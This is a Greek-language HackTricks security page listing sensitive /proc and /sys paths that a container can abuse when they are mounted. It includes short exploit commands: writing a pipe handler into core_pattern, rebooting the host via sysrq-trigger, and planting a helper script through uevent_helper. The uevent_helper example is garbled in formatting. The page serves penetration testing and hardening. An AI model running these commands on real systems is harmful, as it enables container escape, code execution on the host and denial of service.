# Ευαίσθητοι Σημειακοί Σύνδεσμοι

{{#include ../../../../banners/hacktricks-training.md}}

Η έκθεση των `/proc` και `/sys` χωρίς κατάλληλη απομόνωση ονομάτων εισάγει σημαντικούς κινδύνους ασφαλείας, συμπεριλαμβανομένης της αύξησης της επιφάνειας επίθεσης και της αποκάλυψης πληροφοριών. Αυτοί οι φάκελοι περιέχουν ευαίσθητα αρχεία που, αν είναι κακώς ρυθμισμένα ή προσπελάζονται από μη εξουσιοδοτημένο χρήστη, μπορούν να οδηγήσουν σε διαφυγή κοντέινερ, τροποποίηση του κεντρικού υπολογιστή ή να παρέχουν πληροφορίες που βοηθούν σε περαιτέρω επιθέσεις. Για παράδειγμα, η λανθασμένη τοποθέτηση `-v /proc:/host/proc` μπορεί να παρακάμψει την προστασία AppArmor λόγω της φύσης της βασισμένης σε διαδρομές, αφήνοντας το `/host/proc` απροστάτευτο.

**Μπορείτε να βρείτε περισσότερες λεπτομέρειες για κάθε πιθανή ευπάθεια στο** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Ευπάθειες procfs

### `/proc/sys`

Αυτός ο φάκελος επιτρέπει την πρόσβαση για την τροποποίηση μεταβλητών του πυρήνα, συνήθως μέσω `sysctl(2)`, και περιέχει αρκετούς υποφακέλους που προκαλούν ανησυχία:

#### **`/proc/sys/kernel/core_pattern`**

- Περιγράφεται στο [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Επιτρέπει τον καθορισμό ενός προγράμματος που θα εκτελείται κατά την παραγωγή core-file με τα πρώτα 128 bytes ως παραμέτρους. Αυτό μπορεί να οδηγήσει σε εκτέλεση κώδικα αν το αρχείο αρχίζει με έναν σωλήνα `|`.
- **Παράδειγμα Δοκιμής και Εκμετάλλευσης**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Δοκιμή πρόσβασης εγγραφής
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Ορισμός προσαρμοσμένου χειριστή
sleep 5 && ./crash & # Ενεργοποίηση χειριστή
```

#### **`/proc/sys/kernel/modprobe`**

- Λεπτομέρειες στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Περιέχει τη διαδρομή προς τον φορτωτή μονάδων του πυρήνα, που καλείται για τη φόρτωση μονάδων πυρήνα.
- **Παράδειγμα Ελέγχου Πρόσβασης**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Έλεγχος πρόσβασης στο modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Αναφέρεται στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Μια παγκόσμια σημαία που ελέγχει αν ο πυρήνας πανικοβάλλεται ή καλεί τον OOM killer όταν συμβαίνει μια κατάσταση OOM.

#### **`/proc/sys/fs`**

- Σύμφωνα με το [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), περιέχει επιλογές και πληροφορίες σχετικά με το σύστημα αρχείων.
- Η πρόσβαση εγγραφής μπορεί να επιτρέψει διάφορες επιθέσεις άρνησης υπηρεσίας κατά του κεντρικού υπολογιστή.

#### **`/proc/sys/fs/binfmt_misc`**

- Επιτρέπει την καταχώριση διερμηνέων για μη εγγενείς δυαδικές μορφές με βάση τον μαγικό τους αριθμό.
- Μπορεί να οδηγήσει σε εκμετάλλευση δικαιωμάτων ή πρόσβαση σε root shell αν το `/proc/sys/fs/binfmt_misc/register` είναι εγγράψιμο.
- Σχετική εκμετάλλευση και εξήγηση:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Σε βάθος οδηγός: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Άλλες στο `/proc`

#### **`/proc/config.gz`**

- Μπορεί να αποκαλύψει τη διαμόρφωση του πυρήνα αν είναι ενεργοποιημένο το `CONFIG_IKCONFIG_PROC`.
- Χρήσιμο για επιτιθέμενους για την αναγνώριση ευπαθειών στον τρέχοντα πυρήνα.

#### **`/proc/sysrq-trigger`**

- Επιτρέπει την εκτέλεση Sysrq εντολών, προκαλώντας πιθανώς άμεσες επανεκκινήσεις του συστήματος ή άλλες κρίσιμες ενέργειες.
- **Παράδειγμα Επανεκκίνησης Κεντρικού Υπολογιστή**:

```bash
echo b > /proc/sysrq-trigger # Επανεκκινεί τον κεντρικό υπολογιστή
```

#### **`/proc/kmsg`**

- Εκθέτει μηνύματα του δακτυλίου του πυρήνα.
- Μπορεί να βοηθήσει σε εκμεταλλεύσεις πυρήνα, διαρροές διευθύνσεων και να παρέχει ευαίσθητες πληροφορίες συστήματος.

#### **`/proc/kallsyms`**

- Λίστα συμβόλων που εξάγονται από τον πυρήνα και τις διευθύνσεις τους.
- Απαραίτητο για την ανάπτυξη εκμεταλλεύσεων πυρήνα, ειδικά για την υπέρβαση του KASLR.
- Οι πληροφορίες διευθύνσεων περιορίζονται με το `kptr_restrict` ρυθμισμένο σε `1` ή `2`.
- Λεπτομέρειες στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Διασύνδεση με τη συσκευή μνήμης του πυρήνα `/dev/mem`.
- Ιστορικά ευάλωτο σε επιθέσεις εκμετάλλευσης δικαιωμάτων.
- Περισσότερα στο [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Αντιπροσωπεύει τη φυσική μνήμη του συστήματος σε μορφή ELF core.
- Η ανάγνωση μπορεί να διαρρεύσει περιεχόμενα μνήμης του κεντρικού υπολογιστή και άλλων κοντέινερ.
- Το μεγάλο μέγεθος αρχείου μπορεί να οδηγήσει σε προβλήματα ανάγνωσης ή κρασάρισμα λογισμικού.
- Λεπτομερής χρήση στο [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Εναλλακτική διασύνδεση για το `/dev/kmem`, που αντιπροσωπεύει την εικονική μνήμη του πυρήνα.
- Επιτρέπει την ανάγνωση και εγγραφή, επομένως άμεση τροποποίηση της μνήμης του πυρήνα.

#### **`/proc/mem`**

- Εναλλακτική διασύνδεση για το `/dev/mem`, που αντιπροσωπεύει τη φυσική μνήμη.
- Επιτρέπει την ανάγνωση και εγγραφή, η τροποποίηση όλης της μνήμης απαιτεί την επίλυση εικονικών σε φυσικές διευθύνσεις.

#### **`/proc/sched_debug`**

- Επιστρέφει πληροφορίες προγραμματισμού διεργασιών, παρακάμπτοντας τις προστασίες του PID namespace.
- Εκθέτει ονόματα διεργασιών, IDs και αναγνωριστικά cgroup.

#### **`/proc/[pid]/mountinfo`**

- Παρέχει πληροφορίες σχετικά με τα σημεία τοποθέτησης στο namespace τοποθέτησης της διεργασίας.
- Εκθέτει τη θέση του `rootfs` ή της εικόνας του κοντέινερ.

### Ευπάθειες `/sys`

#### **`/sys/kernel/uevent_helper`**

- Χρησιμοποιείται για την επεξεργασία `uevents` συσκευών πυρήνα.
- Η εγγραφή στο `/sys/kernel/uevent_helper` μπορεί να εκτελέσει αυθαίρετα σενάρια κατά την ενεργοποίηση `uevent`.
- **Παράδειγμα Εκμετάλλευσης**: %%%bash

#### Δημιουργεί ένα payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Βρίσκει τη διαδρομή του κεντρικού υπολογιστή από το OverlayFS mount για το κοντέινερ

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Ορίζει το uevent_helper σε κακόβουλο helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Ενεργοποιεί ένα uevent

echo change > /sys/class/mem/null/uevent

#### Διαβάζει την έξοδο

cat /output %%%

#### **`/sys/class/thermal`**

- Ελέγχει τις ρυθμίσεις θερμοκρασίας, προκαλώντας πιθανώς επιθέσεις DoS ή φυσική ζημιά.

#### **`/sys/kernel/vmcoreinfo`**

- Διαρρέει διευθύνσεις πυρήνα, πιθανώς υπονομεύοντας το KASLR.

#### **`/sys/kernel/security`**

- Στεγάζει τη διεπαφή `securityfs`, επιτρέποντας τη ρύθμιση των Linux Security Modules όπως το AppArmor.
- Η πρόσβαση μπορεί να επιτρέψει σε ένα κοντέινερ να απενεργοποιήσει το σύστημα MAC του.

#### **`/sys/firmware/efi/vars` και `/sys/firmware/efi/efivars`**

- Εκθέτει διεπαφές για την αλληλεπίδραση με τις μεταβλητές EFI στο NVRAM.
- Η κακή ρύθμιση ή η εκμετάλλευση μπορεί να οδηγήσει σε κατεστραμμένα laptops ή μηχανές κεντρικού υπολογιστή που δεν εκκινούν.

#### **`/sys/kernel/debug`**

- Το `debugfs` προσφέρει μια διεπαφή αποσφαλμάτωσης "χωρίς κανόνες" στον πυρήνα.
- Ιστορικό προβλημάτων ασφαλείας λόγω της απεριόριστης φύσης του.

### Αναφορές

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Κατανόηση και Σκληραγώγηση των Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Κατάχρηση Προνομιακών και Μη Προνομιακών Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
